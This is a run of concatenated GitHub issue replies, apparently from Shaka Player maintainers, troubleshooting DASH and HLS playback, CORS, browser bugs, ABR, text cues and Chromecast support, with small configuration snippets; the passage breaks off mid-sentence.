http://shaka-player-demo.appspot.com/demo/?asset=https://s3-us-west-2.amazonaws.com/cklsymedia/dash/sintel-2.mpd;play\nThe latest nightly build from master works fine, though:  http://nightly.shaka-player-demo.appspot.com/demo/?asset=https://s3-us-west-2.amazonaws.com/cklsymedia/dash/sintel-2.mpd;play\nSo it appears that this is a duplicate of a bug we've already fixed in master.  We will be releasing v2.0.2 with the fix soon.. Confirmed, duplicate of #579.  Sorry for the confusion!. Both links are working for me on:\n * Chrome 55 on Linux\n * Firefox 50 on Linux (no issues with dev tools being open or closed)\n * Safari 10\nNeither link works for me on Safari 9.  In both cases, the first timestamp is about 83ms, rather than 0, and the video is in a paused state, even though the Player is no longer in a buffering state.\nSo Safari 9 apparently has a bug in its MSE implementation or media stack somewhere that has already been fixed in Safari 10.  You can work around Safari 9's issue by setting video.currentTime to 0.1 or 0.2.  But since seeking to the first timestamp (83ms) does not work around Safari's bug, there's really no good way for the player to automate such a workaround.\nSo Safari 9 is buggy, and we can't do anything about it.  Safari 10 seems to work fine.\nAs for Firefox, I can't reproduce your dev tools issue, so I don't think there's anything further the Shaka Player team can do to help you with that.  If the dev tools issue persists, I recommend moving that support discussion to Mozilla's bug tracker.\nThanks!. Thank you for the report.  In a future release, we will only make text track visibility changes when explicitly requested instead of trying to enable it for you based on heuristics.. Sorry for getting involved so late.  Testing the same content in Shaka Player v2, the content looks broken.\nYour availabilityStartTime parameter keeps changing on manifest updates.  This does not make sense.  availabilityStartTime is the time when the broadcast began.  Timestamps are reckoned relative to this time.\nQuick repro using the latest Shaka Player:\nhttp://shaka-player-demo.appspot.com/demo/?asset=https://staging-playvip.megafon.tv/out/u/v1-video-11.mpd?scheme=https;license=https://staging-widevine.megafon.tv:8081/cenc/getlicense/inventosmegalabs. Changing availabilityStartTime is not valid, therefore this is broken content.  Shaka v1 went through a lot of effort to fix certain bad content.  This is why your other manifest works in v1.6.4.\nWe no longer try to guess what the manifest should say.  Now, we play based on what it does say.\nWe are a very small team.  We do not have the resources to support broken content, and we will not be putting any more effort into Shaka v1.\nCheck to see if your encoder has an update.  Perhaps they have already fixed that bug.  If not, please file a ticket with the encoder vendor.  Feel free to reference this discussion or add me to the conversation to help explain to the encoder vendor why this is broken.. Also, for further help with packaging, segmented, and encrypting content, you should visit our sister project, Shaka Packager.  Here are links to their issue tracker and users list.. If you haven't tried our tutorials yet, please check them out:  http://shaka-player-demo.appspot.com/docs/api/tutorial-basic-usage.html\nAfter that, if you have any further questions about playback or configuring the player, please let us know.  We'll be happy to help.. > How far ahead of the current playhead are new qualities requested and appended?\n\nDon't know. How much previously buffered media replaced - as much or as little as possible?\n\nABR will never cause content already in buffer to be replaced.  We used to remove data ahead of the playhead to make ABR decisions visible sooner, but this created a bad user experience on some platforms.\n\nCan an adaptive bitrate/quality change occur before playback begins?\nDon't know. Revise answers to last two questions.\n\nYes.  If autoplay is disabled, playback will not begin until the user clicks play.  During buffering, the bandwidth estimate is built, and can trigger an ABR decision.  As stated above, that decision will not cause anything to be removed.  So the first segment at least will be at the initial resolution.\n@TheModMaker is working on additions and changes to our docs to help explain ABR better.  Thanks!. @TheModMaker, that's not entirely accurate.  You can override the manifest's minBufferTime, but only with a larger value.  We will buffer at least the manifest's minBufferTime or the configured value of streaming.rebufferingGoal, whichever is larger.. @hyurtseven81, can you please collect some additional data for us?  In the demo app, reproduce the problem.  Then, open the JS console and run this:\njs\nJSON.stringify(shakaDemo.localPlayer_.getStats());\nThen copy the resulting string and paste it here for us.  That will help us understand what the Player and browser were doing when the problem occurred.  Thanks!. It looks like the real problem is not that we enter a buffering state, but rather that the browser can't decode the content fast enough.  It is dropping a lot of frames.  In one set of stats, it dropped 277 / 2421 (11.4%), and in another it dropped 598 / 989 (60.4%).\nThis is not something we can control directly.  The best thing to do would be to limit the resolution chosen on low-end hardware.\nIf you suspect the hardware is low-end, we offer a configuration you can use to restrict the resolution:\njs\nplayer.configure({ restrictions: { maxHeight: 480 } });\nOr:\njs\nplayer.configure({ restrictions: { maxPixels: 640 * 480 } });\n});\nIf the limit is a known hardware limitation, we also have this API which is used to limit to 1080p on Chromecast:\njs\nplayer.setMaxHardwareResolution(720, 480);\nIf you don't know which hardware will drop frames, the best you can do is react to dropped frames dynamically.  There are a few ways to do this.\n\nYou can write your own AbrManager plugin which uses dropped frames to inform adaptation decisions and blacklist resolutions that can't be decoded fast enough.\nYou can modify our default AbrManager plugin (SimplerAbrManager) to account for dropped frames and send us a PR.\nYou can periodically check player.getStats().droppedFrames in your application and use that info to call player.setMaxHardwareResolution() when a lot of frames are being dropped.\n\nDoes this help?. We have never had enough data to determine a good threshold for dropped frames.  This is the main reason our default AbrManager does not account for dropped frames yet.  It's something we'd like to be able to offer, though.. Sorry, I have no insight into Netflix's heuristics for this.\nI think the most reasonable path forward for Shaka Player in the near term is for someone to develop an algorithm that uses dropped frames as feedback to set restriction on what resolutions we choose.  It is unfortunate that we should have to drop frames first to do this, but I see no other way with today's APIs.\nThere are some new APIs being developed for detecting capabilities: https://github.com/WICG/media-capabilities\nThe media capabilities API could, in future, tell us which resolutions/codecs/etc will play well before we play them.  In the mean time, dropped frames is all we really have.. It's been a while since anyone commented on this.  Does anyone have any experience to share regarding dropped frames as an ABR feedback mechanism?  If not, I will eventually close the issue.. @ToreJuloe, thanks.  I've filed https://github.com/google/shaka-player/issues/745 to track any efforts we make in future on using dropped frames for ABR feedback.  I'll go ahead and close this issue now.. This is most likely a CORS (Cross-Origin Resource Sharing) error.  If you open the JS console, you should see some message about that from the browser.  Here's where you can read more about CORS: https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS\nIn short, when your page is hosted on one domain, and your resources are hosted on another, the server must supply special headers in the response.  If it does not, the browser will deny access to that resource.. Yes, by adding the required headers on your server.  Note that this is not a Shaka-specific requirement.  This is something built into all modern browsers to prevent cross-site attacks.\nFor example, our demo content is meant to be accessed by anyone from any domain.  To achieve this, we serve the content (both manifest & media) with these HTTP headers:\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Headers: If-Modified-Since, Range, Origin. Sorry, I'm here to support Shaka Player, not Tomcat or any other web server.  You will have to refer to Tomcat documentation to learn how to configure it.  I couldn't possibly keep up with every web server, and it would be more efficient for you to read the docs for yourself.. Marked as \"external bug\" to reflect that Edge is at fault, but added to the v2.1 milestone for Shaka Player to work around Edge's bug.. The fix for this has just been released in v2.0.3.. The content you're testing with is from Unified Streaming.  (We don't control it.)\nThe \"Tears of Steel (Widevine)\" asset has text streams, but the \"Tears of Steel\" asset (without Widevine) from the same group has no text at all.  So naturally, the non-Widevine asset will not run into this same issue.  MediaKeys should not have anything to do with it.\nTo eliminate MediaKeys from the equation, you could try the asset \"Tears of Steel (subtitles)\" from that same group.  It has text streams, but no encryption.. Ah, so the real problem is that the TextTrackCue constructor is throwing and causing StreamingEngine to break down.. Okay, cool.  Thank you for working on the pull request to correct this on the Toshiba.. I'm labeling this as an enhancement because we need a polyfill for the Toshiba, and as a bug because StreamingEngine shouldn't break down when the cue constructor fails.  I will start work on the StreamingEngine part.. The fix for the StreamingEngine breakdown has just been released in v2.0.3.  The Toshiba polyfill is still a work in progress (#643).. @ErvinGegner, we don't buffer all resolutions at once.  We load the initialization segments of all resolutions so that we can make zero-latency adaptation decisions later.  For this content, init segments are between 638 and 733 bytes each.  In total, we loaded 2738 bytes of initialization segments in 4 HTTP requests.  On my internet connection here at work, this took a total of 377ms.\nI noticed that playback took a while to get started, though.  Now that it's playing, it's hovering around 31 seconds behind the live edge (-0:31 in the video controls).  I jumped to the live edge by clicking on the timecode, but it eventually had to buffer and fall back to -0:04 and again to -0:06.\nFor some reason, we are unable to play at the live edge.  I checked for clock sync issues and found none.  I see that the manifest uses minimumUpdatePeriod of 30s, suggestedPresentationDelay of 25s, and minBufferTime of 30s.  These don't seem crazy off-hand, so it should work.\nWe will investigate further.. I found the source of the problem.  The Playhead class decides whether we are in a buffering state or not.  However, it doesn't account for the live edge, beyond which we can't buffer.  This calculation only works for VOD:\njs\nvar duration = this.video_.duration - fudgeFactor;\nvar atEnd = (bufferEnd >= duration) || (this.video_.ended);. Separate from the bug in our code, there also seem to be some slight problems with the parameters of your manifest.  Even after we have fixed our bug, you should make some changes to improve the performance of your stream.\nWith a presentation delay of 25s, updating the manifest only every 30s means we do still occasionally underrun.  You should make the delay slightly larger than the update period.  Either 35s suggestedPresentationDelay and 30s minimumUpdatePeriod or 25s delay and 20s update should do the trick.\nAlso, you have a minBufferTime of 30s, which is pretty high.  We have to make an exception for the live edge, but this parameter is the minimum amount of content that must be buffered before a player starts playback.  If the user were to seek backward in the stream, say, 45s, the player would have to buffer 30s ahead before it could play again.  This should be reduced to something like 3s or 6s (1 or 2 segments).. We've just pushed a fix for the bug in our code.  This should make things much better.  You can see the fixed code in the master branch and in our nightly build.\nI still recommend some changes to your minBufferTime and to either presentationDelay or minimumUpdatePeriod as outlined above.  Please let me know if there's anything else I can do for you.. No problem.  We are always happy to help.. The fix for this has just been released in v2.0.3.. @sridhard, if the issue was not fixed, we can always reopen #600.  That is much easier to follow and understand than opening a new ticket which has no history and no description of the bug.\nI will close this and reopen #600.  Next time, please just leave a comment on the original issue letting us know that it is not fixed.  We will see the comment in an email update and we can then reopen the issue for you.. This doesn't look right at all.  You seem to be asking to merge all of master into v2.0.x.  What are you trying to do here?. I'm closing this PR for now.  If this was not an accident, please let me know what you are trying to do.  I would be happy to help you.. Good catch, thank you!  Looking at the code, though, I see that there is some additional cleanup that we could do around this.  I'm going to fix this a slightly different way.. Should be fixed now.  Thanks!. The fix for this has just been released in v2.0.3.. Sounds like everything is working now, so I'll go ahead and close this issue.  Thanks!. I'm sorry, but the Toshiba dTV is not up to spec.  If you can detect and fix it with a polyfill, that would be an acceptable solution.  But we won't put platform-specific hacks into the main codebase for a user agent that doesn't follow specs.\nTry checking TextTrackCue.length.  That should allow you to detect the number of arguments it takes and polyfill it to the correct behavior.. In an earlier draft of the spec, TextTrackCue was all there was.  IE11 and Edge only have this 3-argument TextTrackCue.  Later, VTTCue was introduced as a concrete implementation, at which point TextTrackCue became an abstract interface.  Therefore you will not find a TextTrackCue constructor in the specs now.\nI recommend you detect the 7-argument TextTrackCue and implement a standard VTTCue constructor instead.  Here's the spec: https://w3c.github.io/webvtt/#the-vttcue-interface\nYour implementation of VTTCue can then reorder the arguments and call your 7-arg TextTrackCue.  It may not be obvious, but you can return an object from a constructor in JavaScript.  For example:\njs\nfunction FakeArray() {\n  return new Array();\n}\nvar x = new FakeArray();\nconsole.log('x is Array?', x instanceof Array);. @jozefchutka, let's not give up just yet.  You've done all the rest of the work, so I think we can find another way to do the detection.  Here are a couple more options:\n\nParse navigator.userAgent and detect the Toshiba.  The down side is that similar platforms, if there are any, would miss out on the polyfill.\nDetect TextTrackCue.length == 1.  I did some testing, and no currently supported desktop browser looks like this today.  Here's a table:\n\n| browser | TextTrackCue.length | VTTCue.length |\n|-----|-----|-----|\n| Chrome, Opera, Firefox | 0 (abstract, can't be called) | 3 |\n| Safari | 3 | 3 |\n| IE11, Edge | 0 (concrete, can still be called) | (VTTCue does not exist) |. I would prefer detecting either TextTrackCue.length or navigator.userAgent.  Catching exceptions can be expensive, so that should never be part of a success path.  If we are parsing a VTT file with thousands of cues, running a loop over each cue in which we catch an exception and try again with different args would really hurt performance.. Okay, sounds good.  One caught exception at install time is no big deal.. There are some tests that modify shaka.media.TextEngine.CueConstructor to simulate various behaviors from the platform.  Looks like they will need to be updated to work on VTTCue now that CueConstructor is gone.. I have verified that these substitutions in test/media/ttml_text_parser_unit.js and test/media/vtt_text_parser_unit.js fix the issue:\noriginalCueConstructor => originalVTTCue\nshaka.media.TextEngine.CueConstructor => window.VTTCue\nI'll make these changes and manually merge.  Thanks!. Merged as ca299b28228600d64e60982580d65223f791a7d0.. FairPlay is not supported yet.  It's on our roadmap for v2.1 and being tracked in #382.. Good question.  I've never seen a 202 in the wild.\nWhat should the behavior be?  Fail and retry?\nCan you give an example of when a 202 response might occur in a streaming media scenario?. Yes, that sounds reasonable.  I'll add an exception for HTTP 202.. The fix for this has just been released in v2.0.3.. Thanks!  Looking forward to your PR.. I'm sorry, I lost track of this and have not had time to consider it yet.  I'm a bit wary because of the size of the change.  I will be away for the next couple of weeks, but I will try to review it when I return.. I believe this has been obsoleted by our new TextDisplayer interface.\nIn master (and soon to be in v2.2.0), you can register a plugin to handle display of text instead of letting the browser do it.  This gives you total control over style and rendering.\nIf you want to avoid building your own renderer, you can always register a TextDisplayer which modifies the shaka.text.Cue objects and then delegates to our default renderer (which in turn converts to VttCue and relies on the browser to render them).. This sounds like an nginx issue, as specific HTTP responses are outside the control of the client.  We can't directly offer support for nginx, but here's what I would suggest you try next:\n\nCompare a successful HTTP request to a failed on.  Look for differences in request headers and try to determine what causes the difference in the response.\nTry to reproduce the error without Shaka Player.  Make requests with curl or wget or XHR.  If you can reproduce the problem without Shaka Player, it will probably be easier to get support from nginx.\nContact nginx directly for support.  https://www.nginx.com/support/\n\nI will leave this issue open for a while in case any Shaka users with nginx experience have any better advice for you.  Good luck!. Since nobody has had anything to add here, I'm going to close this issue.  I hope you were able to get support from nginx.. Looks good to me.  I'll run it through the build bot.. Thanks!. It looks like the Chromecast Ultra reports that HEVC is supported for clear content, but not for encrypted.  We filter out unsupported streams, hence audio only.\nI will do some testing to find out if it is truly unsupported or if support is being misreported by the platform.. The Chromecast team reports that they have fixed the problem.  It should be released as part of Chromecast firmware v1.23.  I do not know when it will be released, but I would anticipate some time in the next few months.. I just enrolled one of my Chromecast devices in the \"preview program\" and received firmware v1.23.  It does not appear to be out globally yet.. Thanks!. Hi Joe, can you please be more specific?  What part of that looks wrong to you?. When you copy from the JavaScript console and paste into a text editor, you lose all the formatting and it becomes unreadable.  This is why what's in the docs doesn't look exactly like what you pasted.\nIt looks like there are some updates to make, though.  For example, in the tutorial as it is today, we show examples of debug logs before we get to the part about log levels.. I'll also update the part about log levels to be more explicit about where to insert the call to change the level.. The tutorial text has been updated.  The updates will appear in the nightly build tomorrow, and will be released in v2.0.4 next week.. Is it possible to create a simulation of this for integration testing?  Perhaps in the DASH-IF's live sim?. The simplicity of this solution has a definite appeal, but I'm wary of a solution that is based on changing AST.  This is primarily because we've seen so many broken encoders that vary AST almost nonsensically.\nI worry that \"standardizing\" on this will add to the confusion of DASH implementers in general, in particular when there is no guidance from the DASH IF that this is the recommended approach.\nWould your scenario be improved by Shaka Player support for jumping over gaps in the timeline?. @wader, try a new version of CEF (based on Chromium 56) and see if it is the same as #649.  Otherwise, please file a new bug with a specific piece of content so we can reproduce your error.. @wader, no worries.  bufferedAheadOf does some additional logic on top of just checking buffered.  We use it to determine whether or not playback can continue, so we have to predict what sort of gaps the browser will be willing to jump.  I'll admit, it's a little complicated, but it's because we're coping with a complicated and opaque browser behavior.\nJudging from the investigation by @TheModMaker, it does not appear that bufferedAheadOf is the culprit.  We'll keep you posted as we make progress.. The robustness warning can be ignored in this case.  It is generated by Chrome, not by Shaka Player.\nCan you please share manifest and license server URIs so that we can reproduce your issue?  There's nothing we can do if we can't reproduce this.  If you can't share them publicly, please send me a private email.  My address can be found in the CONTRIBUTORS file.. As discussed offline, this appears to be an issue with gaps in the media.  If you can't get your media to start at PTS=DTS=0, you can wait for our solution to #555, which should solve this situation as well.\nFor now, I'm closing this as a duplicate of #555, but please let us know if you have any further questions.  Thanks!. Hi Pavel,\nBefore we can help you, we need to be able to reproduce the issue.  I can't access the manifest URI above.  Can you make this stream available to me somehow?\nAlso, please use our issue template next time you file an issue.  We need answers to the questions in that template before we can help you.\n\nCan you reproduce the issue with our latest release version?\nCan you reproduce the issue with the latest code from master?\nAre you using the demo app or your own custom app?\nIf custom app, can you reproduce the issue using our demo app?\nWhat browser and OS are you using?\nWhat did you do?\nWhat content did you load?\nIf standard demo asset, which one?\nIf custom asset, what manifest and license server URIs?\n\n\nHow did you interact with the content, if at all?. I will plan to roll v2.0.4 next week, and this fix will be easy to cherry-pick to the v2.0.x branch.. The OPTIONS request is done by the browser, not by the Shaka Player library.  This is how cross-origin requests work.  The browser first makes an OPTIONS request to get some information from the server about whether cross-origin requests are welcome.\n\nFor more information on CORS, see https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS\nThere is a site that gives you brief instructions on how to enable CORS on various servers.  Here are some links that might be helpful.\nFor Tomcat: http://enable-cors.org/server_tomcat.html\nFor Nginx: http://enable-cors.org/server_nginx.html. Thanks for filing!\nI did some preliminary investigation.  It appears that we may be missing some touch event in the UI somehow when we enter fullscreen mode.  Only happens on Android because it depends on touch events.. This appears to be happening again.. Shaka Player does not render text cues at all.  That is left up to the browser.  So I'm tempted to say that whitespace rendering behavior should be specified as part of the VTTCue interface and that Shaka Player should provide the correct setting to the browser.\nHowever, since adding features to the VTTCue spec and waiting for implementation may take a long time, I am open to having Shaka Player's TTML parser handle this in the mean time.. Looks like you stumbled into one of the darker corners of CORS.  I was unaware of this, but according to this stackoverflow thread, CORS used to disallow redirects.  http://stackoverflow.com/a/39728229\nIt appears that the spec has changed since then, but that browser implementations have not caught up yet.  \nThat stackoverflow thread has some suggestions to work around this issue, but ultimately, we will need to push browser vendors to fix their implementations.\nWhat browser are you using?  What others have you tried?. Okay, so to confirm, Chrome Canary allows redirects cross-origin?\n(correction: Canary is currently v58, not v56). I managed to put together a simple repro page for this.  It passes in Chrome 57 and 58, but fails in Chrome 56.\nWill test other browsers soon.. Complete status of cross-origin redirects with preflight:\n|Chrome 56 (stable)|Chrome 57 (dev)|Firefox 51 (stable)|Firefox 52 (beta)|Firefox 53 (aurora)|Edge 14|IE 11|Safari 10 (latest)|\n|---|---|---|---|---|---|---|---|\n|FAIL|OK|FAIL|FAIL|FAIL|OK|OK|FAIL|\nChrome has already fixed it, so you can expect it to be released in Chrome stable in about 6 weeks.  Bugs need to be filed against Firefox and Safari.. I filed a bug against Safari here: https://bugs.webkit.org/show_bug.cgi?id=167521\nThere was already a bug filed against Firefox here: https://bugzilla.mozilla.org/show_bug.cgi?id=1312864. Yes, this bug on Firefox is still open as of today: https://bugzilla.mozilla.org/show_bug.cgi?id=1312864  You can expect that CORS redirect will continue to fail in Firefox until after that bug is closed.\nWebKit nightly builds for Mac can be found here: https://webkit.org/nightly/. No, Apple publishes WebKit nightly for OS X only as far as I can tell.  There seems to be a GTK+ port here: https://webkitgtk.org/  I can't really offer any support for you getting/building WebKit on Linux, though.  Good luck!. When I checked two weeks ago, the answer was no.  Check the bugzilla link to see if they have fixed it yet.  If not, comment on the bug and let them know it's important to you.. The upstream issue is still open, and nobody is looking into it yet.  I pinged the upstream issue to ask for someone to take a look.. Firefox just marked their issue \"fixed\" for Firefox 63, which is currently scheduled for beta on 2018-09-05 and stable on 2018-10-23.  Hope that helps!. DASH Interop Points state that segments must be aligned across Representations and that the manifest must be \"approximately\" accurate, which turns out to mean within one half segment in either direction at all times during the presentation.\nSince Shaka Player is an off-the-shelf component that has to interoperate with many other components (encoders, CDNs, etc) in a complex media ecosystem, it would not be feasible for us to try to support content that does not meet the bar for \"interoperable\".  Sorry!. This was an oversight on our part.  It has been fixed in master, and I will cherry-pick it to v2.0.x.  You should see the fix in our upcoming v2.0.6 release.  Thanks!. These are good questions.  Let me give you a bit of context.\nThe gaps look different between Firefox and Chrome because of a series of bugs in Chrome that confuse DTS and PTS.  (http://crbug.com/373039, http://crbug.com/398130, http://crbug.com/398141, and http://crbug.com/402502, collectively tracked by us as #377.)  We expect these bugs to be fixed in Chrome eventually, at which point there should be some fair amount of consistency in gap behavior across browsers.\nWe are also exploring changes in Shaka Player to handle gappy content by jumping over the gaps automatically.  See #180 and #555 for details.  (You may want to subscribe to these issues so you see updates as we make them.)\nSo given that the Chrome team is working on fixing timestamp data in the media pipeline, and that my team is working on a way to cope with gaps no matter what the browser does, we are not interested in making those constants into variables right now.  I would guess that they would go away in a future version of Shaka Player.\nIn the mean time, you could certainly make them into variables in your own fork.  That's one of the benefits of open-source, after all.  We will make an announcement once we have a plan, at which point you can consider switching back to an unmodified version of Shaka Player.  Would that work for you?. I've seen this system code before with corrupted or malformed responses.  Does the license proxy return a raw license response, or a response that is wrapped in some other format?  If it's wrapped, see this tutorial for examples of unwrapping a response: https://shaka-player-demo.appspot.com/docs/api/tutorial-license-wrapping.html. @yairans, please note that while gap-jumping may help with unaligned Representations, unaligned Representations are not compliant with DASH Interop Points.  Shaka Player does not officially support non-interoperable content.. Chrome 57 is the new stable release.  You should have the fix now.  If not, please let us know.. Reported fixed by Microsoft in Edge, but we are unsure what version and have not yet verified the fix.. @rajlaxmi28, what version of Edge are you running?. @rajlaxmi28, this is an issue with Microsoft Edge, so you will need to ask Microsoft for update: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/11016936/\nAlthough they have marked the bug fixed, they have never stated what version of Edge will contain the fix.. I'm happy to help, and I'm sorry I can't give you an authoritative answer on this.  Hopefully Microsoft will get back to us, and if not, I can try to escalate the issue with them.. I just confirmed that this is fixed in Edge/16.16299.. Thank you for checking older versions and for reporting this issue.  We should be able to get it fixed in our next release.. Thanks again for the report.  This was broken in v2.0.3 and will be fixed in v2.0.6.. Renamed this issue and tagged as external bug.  @dulmandakh, please file a bug against Electron and link to it here.  Thanks!. electron/electron#6516 has now been resolved.  Thanks!. Thank you for filing this, and for the PR to fix it!. Looks straight-forward to me.  I'll run it through the build bot.. Much obliged!. In particular, we could have split up the audio and video parts of a variant, and we considered doing so early in our HLS implementation.  We still stream the independently, so separating the streams themselves is not an issue.  But splitting up variants to treat HLS as DASH caused issues with the ABR system.\nWe used to choose audio and video independently, but HLS only provides a bandwidth value for the combination.  There was no way to split them up without making guesses about the proportions.  We found that deducing the correct bandwidth for each was complex and we did not always have enough information to do it.  Rather than potentially break ABR, we decided to change our internal structures to variants.\nExpressing DASH in terms of variants is a trivial transformation by comparison.  Unfortunately, those internal changes necessitated changes to our external track objects.. Options:\n\nDisable these assets over https\nRewrite the license server URIs (in the custom ContentProtection callback) to be https or schemeless\nGet YouTube to update their asset not to specify a scheme or to specify https\n\nI have contacts at YouTube if option 3 seems like the most sensible.  Not sure how option 1 would work.  Option 2 lets us control our own outcome, so would be most expedient.. @TheModMaker, can you try to reproduce?. To be honest, this is outside of our experience.  :-)  But we will try to understand and see what we can do to help.\nHow does your JS library receive these cue points?  Does it poll the server?\nWhat do you need Shaka Player to do with these cue points?  It seems that in your diagram, your code will feed them to the player.  Is that right?. Closing due to inactivity.  We can reopen if/when you are ready, @neilRGS.  Thanks!. Looks good, thanks!. @TobbeEdgeware, this issue has been closed for 11 months, and I can't find any mention of the word \"latency\" in this thread until you brought it up.  It also doesn't appear in the commit that fixed the issue.\nDid you mean to comment on some other issue?. Okay, cool.  Just making sure.  No harm done!. @rounce, you make a good point.  It would seem at a glance that there's no reason you would have to clear audio when switching to a variant with the same audio stream.  However, there are often strange implementation quirks in MSE on various browsers.  We may be doing this to work around a browser bug.\nWe will re-evaluate.. I can't find any reason we should be clearing the audio as well as video when the audio component of a variant is staying the same.  This seems like a thing we could optimize.. We believe this bug has been fixed.  Please let us know when you have a chance to test.. Thank you for letting us know!. We officially support the latest stable release version of Edge.  We will support older versions when feasible, but in this case, we are not able to support both Edge 14 and Edge 15.. @kvarro, we have a fix in progress, but we are taking a little extra time to refactor the MP4 parser class.  Thanks for the contribution, though!. The fixes related to this will not cherry-pick cleanly to v2.0.x, so this fix will first appear in v2.1.0.. In the manifest structure, each Stream has an InitSegmentReference.  If the segments are self-initializing, you can leave it null.  Otherwise, you will need to construct a valid reference to a valid init segment.\nIf you can construct a valid MP4 init segment in the manifest parser, you could set the URI in the InitSegmentReference to a data URI containing the init segment.\nIf you would rather not spend the memory upfront and you'd rather construct them on-the-fly, you could always do something a little more complicated.  You could register a scheme handler with NetworkingEngine, construct a URI of your own devising for each init segment which points back to your scheme, and then your scheme handler plugin can construct the init segment when requested.\nI strongly advise the data URI approach, unless you run into serious issues with it.. JFYI, we are planning some changes to the internal manifest structure in #1339.  This would impact your work on SmoothStreaming.\nI'll let you know once we start work on that, so you can keep pace with the changes we are making.  Mostly, you will just need to move some properties to other objects.\nDoes SmoothStreaming have an equivalent to DASH's periods?  Or HLS's discontinuities?. DASH and MSS are two independent streaming formats, so a DASH player isn't necessarily also an MSS player.  If you would like start a discussion comparing various players and their features, please file a new issue.  This one is about implementing MSS in Shaka Player.\nAs for ETA, the contributors working on that feature will have to answer.  The Shaka Player team are not working on this one ourselves right now.. I think it would be best for one person or group of people to complete a working MSS implementation and then send a pull request.  @subhranshudas, it would not make sense for you to start working on an independent MSS implementation of your own.. @yairans, can you retry with the latest code from master?. Since there has been no reply in over 4 weeks, I'm closing this issue.  @yairans, we can reopen at any time if you still need help with this.. @hariszukanovic, since we haven't heard back from you in a few weeks, I'm closing this issue due to inactivity.  We can reopen it at any time if you wish.. Here's a quick repro link based on the asset linked above.  Since the content URL is only available in HTTP and not HTTPS, this link uses a proxy to work around mixed content errors:\nhttps://shaka-player-demo.appspot.com/demo/?play;asset=https://cors-anywhere.herokuapp.com/http://dash.edgesuite.net/dash264/TestCases/3a/fraunhofer/aac-lc_stereo_without_video/ElephantsDream/elephants_dream_audio_only_aaclc_stereo_sidx.mpd\nI just tested on Chrome 57.0.2987.75 on ChromeOS, and I was unable to reproduce.  I have not tried on Mac yet.. @vinnichenko, can you provide us with any way to reproduce the problem?  It will be very difficult to diagnose if we can't reproduce it.. This sounds like a CORS issue.  Cross-origin, your license server must explicitly expose the header, as well.  Otherwise, the browser will not allow the JavaScript application to see it.\nSee: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Expose-Headers\nDoes this help?. Glad to hear it!  Since it sounds like everything's resolved, I'll go ahead and close the issue.. It is not trivial to create video thumbnails without getting them from the manifest.  If you wanted to create them from the video element itself, you would need an offscreen video element to seek through while copying frames to a canvas.  It would be very complicated, and you would only be able to do so for clear content.\nBecause of this, we will not try to implement thumbnails without support from the manifest.  If you want to pursue it yourself, though, please feel free.  The beauty of open source is that you can modify it any way you like.  Good luck!. Renamed and reopened to track switching between periods with and without text.. This was just released in v2.0.7.. I agree with @TheModMaker.  It may be easier to start fresh than to fork DashParser, which is very complicated.\nI don't see any reason for BUFFER_READ_OUT_OF_BOUNDS to be thrown, unless you supplied the wrong byte range or URL for an index segment.  It might be best to look at that first, since there are very few paths in the code that would lead to segments being parsed.. @TheModMaker, let's send @fernandoneira a preview for additional feedback once we're done with internal review on your new tutorial.. We will do a v2.0.7 release in the near future, with this and any other accumulated bug fixes.  Thanks!. This was just released in v2.0.7.. Your demo page works for me, so I have a theory about what is going on.\nNeither your demo page nor the Basic Usage tutorial configure clock sync.  Our demo app has a clock sync config to work with live streams that don't have their own clock sync elements (<UTCTiming>) in the manifest.  The reason your demo page works for me is that my desktop computer's clock happens to be accurate.\nMany clients have inaccurate clocks, and clock sync allows Shaka Player to adjust the client's clock to match the server.  This synchronization is critical for live streaming.\nIf the manifest does not contain any clock sync info (<UTCTiming> elements), your application must provide a fallback.  Here's an example:\njs\nplayer.configure({\n  manifest: {\n    dash: {\n      clockSyncUri: '//foo.bar/clock.sync.txt'\n    }\n  }\n});\nThe player will made a HEAD request to the clock sync URI and read the Date header.  It can be any URI you control.  It will use that as the official current time, and make adjustments to the client's clock any time it needs to perform time calculations for the live stream.\nFor this to work cross-origin, you must both allow access and expose the Date header to the client.  For more information on cross-origin headers, see this MDN article: https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS\nPay particular attention to Access-Control-Allow-Methods (for preflight), Access-Control-Allow-Origin (for both preflight and the HEAD request), and Access-Control-Expose-Headers (for the HEAD request).\nDoes this help?. Happy to help.  Let us know if you need anything else.. @KingjZhang, please update Wowza and let us know if that resolves your issue.  Thanks!. @KingjZhang, changing availabilityStartTime is not valid in our view, and we believe this will be resolved by updating Wowza.  I'm going to go ahead and close this issue for now.  If an update does not solve your problem, let us know and we can help investigate.. @kvarro, we have a fix in progress, but we are taking a little extra time to refactor the MP4 parser class.  Thanks for the contribution, though!. @kvarro, we have recently pushed a fix for this to the master branch.  Refactoring took place in 175870fb4df2e73bce9314e4118911593b0de1b2 and the actual fix was in e50d01e03c1f2fdeb8b91887c921533134b10518.  A follow-up bug fix was in 3af1f0fe984adfaf8d9b6567604888b9a4604cd6.\nI'm closing this PR now.  Thanks for your efforts!. I was not aware of those requirements, so it would appear Shaka Player's receiver is non-compliant at the moment.  I'm not certain, but I would guess this part of the SDK docs show why these requirements exist:\n\nCommands from sender to receiver\nThese commands control the media player. ... This will allow generic remote control apps to work properly.\n\nI'm not familiar with generic remote control apps, but it seems that these com.google.cast.media-namespaced commands would be important for that.\nWe'll take it on as an enhancement to support these commands as well as our custom ones.  We will also see if we can find a generic remote control app for testing.\nFor now, I think you can expect your Shaka-based sender to work with your Shaka-based receiver, but that other senders would be unable to send a pause, seek, or volume command to your receiver app.  If this is acceptable to you for the time being, you can always upgrade your receiver to a new release of Shaka Player after we implement these generic commands.\nI don't have a timeline for implementation and release right now, but I will try to schedule it soon.  Thanks!. I see.  Thanks for the tips!\nI've added this optimistically to the v2.1 milestone.  If we finish this before we finish HLS, it will appear in v2.1.  As soon as HLS is done, this will slip to the next milestone.  Thanks!. Okay, it looks like we have some work to do, then.  Here's a quick design for how these required commands will map to Shaka Player:\nRequired messages from sender to receiver\nLoad\nThe autoplay and currentTime fields will be directly supported.\nThe message contains a content ID inside the MediaInformation structure.  We will invoke a callback to the receiver app to translate this into a manifest URI, and in the absence of that callback, we will assume the content ID field contains a manifest URI.  This seems to be allowed by the cast SDK docs.\nThe customData field of the Load message will be given to shaka.util.CastReceiver's opt_appDataCallbackopt.\nPause\nWill call 